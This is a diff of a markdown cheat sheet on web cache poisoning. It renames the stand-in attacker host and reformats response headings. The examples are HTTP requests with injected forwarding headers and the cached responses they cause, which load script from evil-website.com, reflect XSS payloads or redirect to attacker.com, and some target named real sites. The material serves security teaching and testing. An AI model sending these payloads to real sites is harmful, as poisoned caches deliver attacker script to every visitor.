@@ -17,23 +17,21 @@ The objective of web cache poisoning is to send a request that causes a harmful 
 ```
 GET / HTTP/1.1
 Host: www.vuln.com
-X-Forwarded-Host: evil.com
-```
-The response is
-```
+X-Forwarded-Host: evil-website.com
+
+### Response:
 HTTP/1.1 200 OK
 Cache-Control: public, no-cache
 …
-<img href="https://evil.com/a.png" />
+<img href="https://evil-website.com/a.png" />
 ```
 > Or you can input XSS payloads
 ```
 GET / HTTP/1.1
 Host: www.vuln.com
 X-Forwarded-Host: a.\"><script>alert(1)</script>
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 200 OK
 Cache-Control: public, no-cache
 …
@@ -44,16 +42,15 @@ Cache-Control: public, no-cache
 ```
 GET / HTTP/1.1
 Host: unity3d.com
-X-Host: evil.com
-```
-The response is
-```
+X-Host: evil-website.com
+
+### Response:
 HTTP/1.1 200 OK
 Via: 1.1 varnish-v4
 Age: 174
 Cache-Control: public, max-age=1800
 …
-<script src="https://evil.com/x.js">
+<script src="https://evil-website.com/x.js">
 </script>
 ```
 
@@ -63,9 +60,8 @@ GET / HTTP/1.1
 Host: redacted.com
 User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
 X-Forwarded-Host: a"><iframe onload=alert(1)>
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 200 OK
 X-Served-By: cache-lhr6335-LHR
 Vary: User-Agent, Accept-Encoding
@@ -79,9 +75,8 @@ Vary: User-Agent, Accept-Encoding
 GET /en HTTP/1.1
 Host: redacted.net
 X-Forwarded-Host: xyz
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 200 OK
 Set-Cookie: locale=en; domain=xyz
 ```
@@ -90,9 +85,8 @@ Set-Cookie: locale=en; domain=xyz
 GET /en HTTP/1.1
 Host: redacted.net
 X-Forwarded-Scheme: nothttps
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 301 Moved Permanently
 Location: https://redacted.net
 ```
@@ -102,9 +96,8 @@ GET /en HTTP/1.1
 Host: redacted.net
 X-Forwarded-Host: attacker.com
 X-Forwarded-Scheme: nothttps
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 301 Moved Permanently
 Location: https://attacker.com/en
 ```
@@ -114,9 +107,8 @@ Location: https://attacker.com/en
 GET / HTTP/1.1
 Host: www.goodhire.com
 X-Forwarded-Server: evil
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 404 Not Found
 CF-Cache-Status: MISS
 ...
@@ -128,9 +120,8 @@ To exploit this, we need to go to hubspot.com, register ourselves as a HubSpot c
 GET / HTTP/1.1
 Host: www.goodhire.com
 X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 200 OK
 …
 <script>alert(document.domain)</script>
@@ -141,9 +132,8 @@ HTTP/1.1 200 OK
 GET / HTTP/1.1
 Host: blog.cloudflare.com
 X-Forwarded-Host: evil
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 302 Found
 Location: https://ghost.org/fail/
 ```
@@ -152,9 +142,8 @@ When a user first registers a blog with Ghost, it issues them with a unique subd
 GET / HTTP/1.1
 Host: blog.cloudflare.com
 X-Forwarded-Host: noshandnibble.ghost.io
-```
-The response is
-```
+
+### Response:
 HTTP/1.1 302 Found
 Location: http://noshandnibble.blog/
 ```
